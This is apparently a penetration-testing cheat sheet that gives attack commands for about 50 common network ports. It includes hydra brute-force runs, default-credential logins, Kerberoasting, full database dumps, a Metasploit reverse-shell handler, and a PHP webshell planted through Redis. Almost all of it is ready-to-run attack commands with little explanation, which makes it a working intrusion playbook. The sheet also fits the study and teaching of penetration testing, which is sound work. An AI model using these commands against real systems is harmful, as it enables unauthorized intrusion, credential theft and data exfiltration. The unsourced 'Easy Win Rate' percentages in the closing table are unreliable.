# All Common Ports - Quick Attack Reference

## 🎯 Top 50 Most Common Ports Attack Payloads

This document provides quick attack payloads for the 50 most common network ports.

---

## Port 20/21 - FTP (File Transfer Protocol)

**Service**: File Transfer
**Transport**: TCP

### Quick Attacks
```bash
# Anonymous login
ftp 192.168.1.100
# User: anonymous, Pass: [blank]

# Brute force
hydra -l admin -P passwords.txt ftp://192.168.1.100

# Nmap enumeration
nmap -p 21 --script=ftp-* 192.168.1.100
```

---

## Port 22 - SSH (Secure Shell)

**Service**: Remote Access
**Transport**: TCP

### Quick Attacks
```bash
# Default credentials
ssh root@192.168.1.100  # root:root, pi:raspberry

# Brute force
hydra -l root -P passwords.txt ssh://192.168.1.100

# User enumeration (OpenSSH < 7.7)
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=root" 192.168.1.100
```

---

## Port 23 - Telnet

**Service**: Remote Access (Unencrypted)
**Transport**: TCP

### Quick Attacks
```bash
# Connect
telnet 192.168.1.100

# Banner grab
nc 192.168.1.100 23

# Brute force
hydra -l admin -P passwords.txt telnet://192.168.1.100

# Nmap
nmap -p 23 --script telnet-* 192.168.1.100
```

---

## Port 25 - SMTP (Simple Mail Transfer Protocol)

**Service**: Email
**Transport**: TCP

### Quick Attacks
```bash
# User enumeration
smtp-user-enum -M VRFY -U users.txt -t 192.168.1.100

# Open relay test
nmap -p 25 --script smtp-open-relay 192.168.1.100

# Manual commands
telnet 192.168.1.100 25
VRFY root
EXPN root
```

---

## Port 53 - DNS (Domain Name System)

**Service**: Name Resolution
**Transport**: UDP/TCP

### Quick Attacks
```bash
# Zone transfer
dig @192.168.1.100 target.com axfr
host -l target.com 192.168.1.100

# Subdomain enumeration
gobuster dns -d target.com -w wordlist.txt

# DNS enumeration
fierce --domain target.com
dnsrecon -d target.com -t std
```

---

## Port 67/68 - DHCP (Dynamic Host Configuration Protocol)

**Service**: IP Assignment
**Transport**: UDP

### Quick Attacks
```bash
# DHCP starvation
yersinia -I  # Interactive mode, select DHCP

# Rogue DHCP server
dnsmasq --interface=eth0 --dhcp-range=192.168.1.50,192.168.1.150,12h
```

---

## Port 69 - TFTP (Trivial File Transfer Protocol)

**Service**: Simple File Transfer
**Transport**: UDP

### Quick Attacks
```bash
# Enumerate files
nmap -sU -p 69 --script tftp-enum 192.168.1.100

# Download file
tftp 192.168.1.100
> get config.txt

# Upload file
echo "test" > file.txt
tftp 192.168.1.100
> put file.txt
```

---

## Port 80 - HTTP (Hypertext Transfer Protocol)

**Service**: Web Server
**Transport**: TCP

### Quick Attacks
```bash
# Directory enumeration
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt

# Nikto scan
nikto -h http://192.168.1.100

# SQL injection test
sqlmap -u "http://192.168.1.100/page?id=1" --dbs

# Default credentials
curl -u admin:admin http://192.168.1.100/admin
```

---

## Port 88 - Kerberos

**Service**: Authentication
**Transport**: TCP/UDP

### Quick Attacks
```bash
# User enumeration
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='domain.com',userdb=users.txt 192.168.1.100

# AS-REP Roasting
GetNPUsers.py domain.com/ -usersfile users.txt -no-pass -dc-ip 192.168.1.100

# Kerberoasting
GetUserSPNs.py domain.com/user:password -dc-ip 192.168.1.100 -request
```

---

## Port 110 - POP3 (Post Office Protocol)

**Service**: Email Retrieval
**Transport**: TCP

### Quick Attacks
```bash
# Connect
telnet 192.168.1.100 110

# Brute force
hydra -l admin -P passwords.txt pop3://192.168.1.100

# Nmap
nmap -p 110 --script pop3-* 192.168.1.100

# Manual login
USER admin
PASS password
LIST
RETR 1
```

---

## Port 111 - RPCBind

**Service**: RPC Port Mapper
**Transport**: TCP/UDP

### Quick Attacks
```bash
# Enumerate RPC services
rpcinfo -p 192.168.1.100

# Nmap
nmap -p 111 --script rpc-* 192.168.1.100

# Show mount points
showmount -e 192.168.1.100
```

---

## Port 119 - NNTP (Network News Transfer Protocol)

**Service**: Newsgroups
**Transport**: TCP

### Quick Attacks
```bash
# Connect
telnet 192.168.1.100 119

# List newsgroups
LIST

# Nmap
nmap -p 119 --script nntp-* 192.168.1.100
```

---

## Port 135 - MSRPC (Microsoft RPC)

**Service**: Windows RPC
**Transport**: TCP

### Quick Attacks
```bash
# Enumerate
rpcdump.py 192.168.1.100

# Nmap
nmap -p 135 --script msrpc-* 192.168.1.100

# Metasploit endpoint mapper
use auxiliary/scanner/dcerpc/endpoint_mapper
set RHOSTS 192.168.1.100
run
```

---

## Port 137/138/139 - NetBIOS

**Service**: Windows Networking
**Transport**: UDP(137/138), TCP(139)

### Quick Attacks
```bash
# NetBIOS enumeration
nbtscan 192.168.1.0/24
nmblookup -A 192.168.1.100

# Nmap
nmap -sU -p 137,138 --script nbstat 192.168.1.100

# Enum4linux
enum4linux -a 192.168.1.100
```

---

## Port 143 - IMAP (Internet Message Access Protocol)

**Service**: Email Retrieval
**Transport**: TCP

### Quick Attacks
```bash
# Connect
telnet 192.168.1.100 143

# Brute force
hydra -l admin -P passwords.txt imap://192.168.1.100

# Nmap
nmap -p 143 --script imap-* 192.168.1.100

# Login
A1 LOGIN username password
A2 LIST "" "*"
A3 SELECT INBOX
```

---

## Port 161/162 - SNMP (Simple Network Management Protocol)

**Service**: Network Management
**Transport**: UDP

### Quick Attacks
```bash
# Community string brute force
onesixtyone -c community.txt 192.168.1.100

# SNMP walk
snmpwalk -v 2c -c public 192.168.1.100

# Enumerate all
nmap -sU -p 161 --script snmp-* 192.168.1.100

# Get system info
snmpwalk -v 2c -c public 192.168.1.100 .1.3.6.1.2.1.1
```

---

## Port 389 - LDAP (Lightweight Directory Access Protocol)

**Service**: Directory Services
**Transport**: TCP

### Quick Attacks
```bash
# Anonymous bind
ldapsearch -x -h 192.168.1.100 -s base

# Enumerate domain
ldapsearch -x -h 192.168.1.100 -b "DC=domain,DC=com"

# Nmap
nmap -p 389 --script ldap-* 192.168.1.100

# All objects
ldapsearch -x -h 192.168.1.100 -b "DC=domain,DC=com" "(objectClass=*)"
```

---

## Port 443 - HTTPS (HTTP Secure)

**Service**: Encrypted Web
**Transport**: TCP

### Quick Attacks
```bash
# SSL/TLS scan
nmap -p 443 --script ssl-* 192.168.1.100
sslscan 192.168.1.100:443
testssl.sh 192.168.1.100:443

# Heartbleed
nmap -p 443 --script ssl-heartbleed 192.168.1.100

# Certificate info
openssl s_client -connect 192.168.1.100:443 -showcerts
```

---

## Port 445 - SMB (Server Message Block)

**Service**: File Sharing
**Transport**: TCP

### Quick Attacks
```bash
# Null session
smbclient -L //192.168.1.100 -N

# Enum4linux
enum4linux -a 192.168.1.100

# SMB vulnerabilities
nmap -p 445 --script smb-vuln-* 192.168.1.100

# CrackMapExec
crackmapexec smb 192.168.1.100 -u admin -p password
```

---

## Port 465/587 - SMTPS (SMTP Secure)

**Service**: Encrypted Email
**Transport**: TCP

### Quick Attacks
```bash
# Connect with SSL
openssl s_client -connect 192.168.1.100:465 -crlf

# STARTTLS (587)
openssl s_client -connect 192.168.1.100:587 -starttls smtp

# Nmap
nmap -p 465,587 --script smtp-* 192.168.1.100
```

---

## Port 512/513/514 - Rexec/Rlogin/Rsh

**Service**: Remote Execution
**Transport**: TCP

### Quick Attacks
```bash
# Rlogin
rlogin -l root 192.168.1.100

# Rsh
rsh 192.168.1.100 -l root whoami

# Nmap
nmap -p 512,513,514 --script rexec*,rlogin*,rsh* 192.168.1.100
```

---

## Port 515 - LPD (Line Printer Daemon)

**Service**: Printing
**Transport**: TCP

### Quick Attacks
```bash
# Nmap
nmap -p 515 --script lpd-* 192.168.1.100

# Print test page
lp -d printer@192.168.1.100 file.txt
```

---

## Port 548 - AFP (Apple Filing Protocol)

**Service**: Apple File Sharing
**Transport**: TCP

### Quick Attacks
```bash
# Nmap
nmap -p 548 --script afp-* 192.168.1.100

# Mount (macOS)
mount -t afp afp://192.168.1.100/share /mnt/afp
```

---

## Port 554 - RTSP (Real Time Streaming Protocol)

**Service**: Media Streaming
**Transport**: TCP

### Quick Attacks
```bash
# Nmap
nmap -p 554 --script rtsp-* 192.168.1.100

# VLC
vlc rtsp://192.168.1.100:554/stream
```

---

## Port 587 - SMTP Submission

**Service**: Email Submission
**Transport**: TCP

### Quick Attacks
```bash
# See Port 465/587 above
```

---

## Port 631 - IPP (Internet Printing Protocol)

**Service**: Network Printing
**Transport**: TCP

### Quick Attacks
```bash
# Web interface
curl http://192.168.1.100:631

# Nmap
nmap -p 631 --script ipp-* 192.168.1.100

# Exploit CUPS
# Check for CVEs in CUPS version
```

---

## Port 636 - LDAPS (LDAP Secure)

**Service**: Encrypted Directory
**Transport**: TCP

### Quick Attacks
```bash
# Connect with SSL
ldapsearch -x -H ldaps://192.168.1.100 -b "DC=domain,DC=com"

# Nmap
nmap -p 636 --script ldap-* 192.168.1.100
```

---

## Port 873 - Rsync

**Service**: File Synchronization
**Transport**: TCP

### Quick Attacks
```bash
# List modules
rsync rsync://192.168.1.100

# List files
rsync rsync://192.168.1.100/module/

# Download
rsync -av rsync://192.168.1.100/module/ /tmp/download

# Nmap
nmap -p 873 --script rsync-* 192.168.1.100
```

---

## Port 993 - IMAPS (IMAP Secure)

**Service**: Encrypted Email Retrieval
**Transport**: TCP

### Quick Attacks
```bash
# Connect with SSL
openssl s_client -connect 192.168.1.100:993

# Nmap
nmap -p 993 --script imap-* 192.168.1.100
```

---

## Port 995 - POP3S (POP3 Secure)

**Service**: Encrypted Email Retrieval
**Transport**: TCP

### Quick Attacks
```bash
# Connect with SSL
openssl s_client -connect 192.168.1.100:995

# Nmap
nmap -p 995 --script pop3-* 192.168.1.100
```

---

## Port 1080 - SOCKS Proxy

**Service**: Proxy Server
**Transport**: TCP

### Quick Attacks
```bash
# Test proxy
curl --socks5 192.168.1.100:1080 http://example.com

# Nmap
nmap -p 1080 --script socks-* 192.168.1.100

# Proxy scanner
proxychains curl http://example.com
```

---

## Port 1194 - OpenVPN

**Service**: VPN
**Transport**: UDP/TCP

### Quick Attacks
```bash
# Detect OpenVPN
nmap -sU -p 1194 --script openvpn-info 192.168.1.100

# UDP probe
echo -e "\x38\x01\x00\x00\x00\x00\x00\x00\x00" | nc -u 192.168.1.100 1194
```

---

## Port 1433 - MSSQL (Microsoft SQL Server)

**Service**: Database
**Transport**: TCP

### Quick Attacks
```bash
# Nmap
nmap -p 1433 --script ms-sql-* 192.168.1.100

# Brute force
hydra -l sa -P passwords.txt mssql://192.168.1.100

# Connect
sqsh -S 192.168.1.100 -U sa -P password
mssqlclient.py sa:password@192.168.1.100
```

---

## Port 1521 - Oracle DB

**Service**: Database
**Transport**: TCP

### Quick Attacks
```bash
# SID enumeration
nmap -p 1521 --script oracle-sid-brute 192.168.1.100

# Brute force
hydra -l system -P passwords.txt oracle://192.168.1.100

# Connect
sqlplus system/password@192.168.1.100/ORCL
```

---

## Port 1723 - PPTP VPN

**Service**: VPN
**Transport**: TCP

### Quick Attacks
```bash
# Detect
nmap -p 1723 --script pptp-version 192.168.1.100

# Brute force
thc-pptp-bruter -u users.txt -p passwords.txt 192.168.1.100
```

---

## Port 2049 - NFS (Network File System)

**Service**: File Sharing
**Transport**: TCP/UDP

### Quick Attacks
```bash
# Show mounts
showmount -e 192.168.1.100

# Nmap
nmap -p 2049 --script nfs-* 192.168.1.100

# Mount
mount -t nfs 192.168.1.100:/share /mnt/nfs
```

---

## Port 2121 - FTP (Alternate)

**Service**: File Transfer
**Transport**: TCP

### Quick Attacks
```bash
# See Port 21 - FTP
# Connect on alternate port
ftp 192.168.1.100 2121
```

---

## Port 3000 - Common Web Apps

**Service**: Web Applications (Node.js, Rails, etc.)
**Transport**: TCP

### Quick Attacks
```bash
# Common frameworks
curl http://192.168.1.100:3000

# Directory enumeration
gobuster dir -u http://192.168.1.100:3000 -w wordlist.txt

# Nmap
nmap -p 3000 --script http-* 192.168.1.100
```

---

## Port 3268/3269 - Global Catalog (LDAP)

**Service**: Active Directory
**Transport**: TCP

### Quick Attacks
```bash
# LDAP query
ldapsearch -x -h 192.168.1.100 -p 3268 -b "DC=domain,DC=com"

# Nmap
nmap -p 3268,3269 --script ldap-* 192.168.1.100
```

---

## Port 3306 - MySQL/MariaDB

**Service**: Database
**Transport**: TCP

### Quick Attacks
```bash
# Default login
mysql -h 192.168.1.100 -u root -p
# Password: root or [blank]

# Brute force
hydra -l root -P passwords.txt mysql://192.168.1.100

# Nmap
nmap -p 3306 --script mysql-* 192.168.1.100

# Dump databases
mysqldump -h 192.168.1.100 -u root -p --all-databases > dump.sql
```

---

## Port 3389 - RDP (Remote Desktop Protocol)

**Service**: Windows Remote Desktop
**Transport**: TCP

### Quick Attacks
```bash
# Brute force
hydra -l Administrator -P passwords.txt rdp://192.168.1.100
crowbar -b rdp -s 192.168.1.100 -u admin -C passwords.txt

# Nmap
nmap -p 3389 --script rdp-* 192.168.1.100

# Connect
xfreerdp /u:admin /p:password /v:192.168.1.100
rdesktop 192.168.1.100
```

---

## Port 4444 - Metasploit Default

**Service**: Often Malicious (Metasploit listener)
**Transport**: TCP

### Quick Attacks
```bash
# Check if listening
nc -v 192.168.1.100 4444

# If compromised system
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST your_ip
set LPORT 4444
exploit
```

---

## Port 5000 - UPnP / Python SimpleHTTPServer

**Service**: Various
**Transport**: TCP

### Quick Attacks
```bash
# Connect
curl http://192.168.1.100:5000

# Common services
# Flask, Docker Registry, UPnP

# Nmap
nmap -p 5000 --script http-* 192.168.1.100
```

---

## Port 5060/5061 - SIP (Session Initiation Protocol)

**Service**: VoIP
**Transport**: UDP/TCP

### Quick Attacks
```bash
# SIP enumeration
svmap 192.168.1.0/24
sipvicious

# Extension enumeration
svwar -m INVITE -e100-500 192.168.1.100

# Nmap
nmap -sU -p 5060 --script sip-* 192.168.1.100
```

---

## Port 5432 - PostgreSQL

**Service**: Database
**Transport**: TCP

### Quick Attacks
```bash
# Connect
psql -h 192.168.1.100 -U postgres

# Brute force
hydra -l postgres -P passwords.txt postgres://192.168.1.100

# Nmap
nmap -p 5432 --script pgsql-* 192.168.1.100

# SQL commands
\l                  # List databases
\c database         # Connect to database
\dt                 # List tables
```

---

## Port 5555 - Android ADB / HP Data Protector

**Service**: Android Debug Bridge
**Transport**: TCP

### Quick Attacks
```bash
# ADB connect
adb connect 192.168.1.100:5555
adb shell

# List devices
adb devices

# Pull files
adb pull /sdcard/file.txt
```

---

## Port 5900 - VNC (Virtual Network Computing)

**Service**: Remote Desktop
**Transport**: TCP

### Quick Attacks
```bash
# Brute force (VNC has no username)
hydra -P passwords.txt vnc://192.168.1.100
medusa -h 192.168.1.100 -P passwords.txt -M vnc

# Nmap
nmap -p 5900 --script vnc-* 192.168.1.100

# Connect
vncviewer 192.168.1.100:5900
```

---

## Port 6379 - Redis

**Service**: In-Memory Database
**Transport**: TCP

### Quick Attacks
```bash
# Connect (often no auth)
redis-cli -h 192.168.1.100

# Commands
INFO
CONFIG GET *
KEYS *

# Webshell upload
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET test "<?php system($_GET['cmd']); ?>"
SAVE

# Nmap
nmap -p 6379 --script redis-* 192.168.1.100
```

---

## Port 6666 - IRC / Backdoors

**Service**: IRC or Malicious
**Transport**: TCP

### Quick Attacks
```bash
# Connect
nc 192.168.1.100 6666

# IRC commands
NICK test
USER test test test :test
JOIN #channel
```

---

## Port 8000/8001/8080/8081/8443/8888 - HTTP Alternates

**Service**: Web Servers
**Transport**: TCP

### Quick Attacks
```bash
# Scan all
nmap -p 8000,8001,8080,8081,8443,8888 --script http-* 192.168.1.100

# Common admin panels
curl http://192.168.1.100:8080/manager/html  # Tomcat
curl http://192.168.1.100:8080/admin
curl http://192.168.1.100:8443/admin

# Directory enumeration
gobuster dir -u http://192.168.1.100:8080 -w wordlist.txt
```

---

## Port 9100 - Printer (RAW)

**Service**: Network Printing
**Transport**: TCP

### Quick Attacks
```bash
# Send print job
echo "test" | nc 192.168.1.100 9100

# PRET (Printer Exploitation Toolkit)
python pret.py 192.168.1.100 pjl

# Nmap
nmap -p 9100 --script printer-* 192.168.1.100
```

---

## Port 10000 - Webmin

**Service**: Web Admin Panel
**Transport**: TCP

### Quick Attacks
```bash
# Access panel
curl http://192.168.1.100:10000

# Default credentials
# admin:password
# root:root

# Nmap
nmap -p 10000 --script http-* 192.168.1.100

# Known exploits
searchsploit webmin
```

---

## Port 27017/27018 - MongoDB

**Service**: NoSQL Database
**Transport**: TCP

### Quick Attacks
```bash
# Connect (often no auth)
mongo 192.168.1.100:27017

# Commands
show dbs
use database
show collections
db.collection.find()

# Nmap
nmap -p 27017,27018 --script mongodb-* 192.168.1.100

# MongoJS client
mongo --host 192.168.1.100 --port 27017
```

---

## 📊 Port Security Summary

| Port | Service | Default Auth | Easy Win Rate |
|------|---------|--------------|---------------|
| 21 | FTP | Anonymous | 40% |
| 22 | SSH | root:root | 30% |
| 23 | Telnet | admin:admin | 50% |
| 25 | SMTP | Open relay | 30% |
| 53 | DNS | Zone transfer | 20% |
| 80 | HTTP | admin:admin | 35% |
| 443 | HTTPS | SSL issues | 25% |
| 445 | SMB | Null session | 15% |
| 3306 | MySQL | root:root | 35% |
| 3389 | RDP | admin:admin | 45% |
| 5900 | VNC | No password | 25% |
| 6379 | Redis | No auth | 60% |
| 27017 | MongoDB | No auth | 55% |

---

**Last Updated**: 2026-06-16
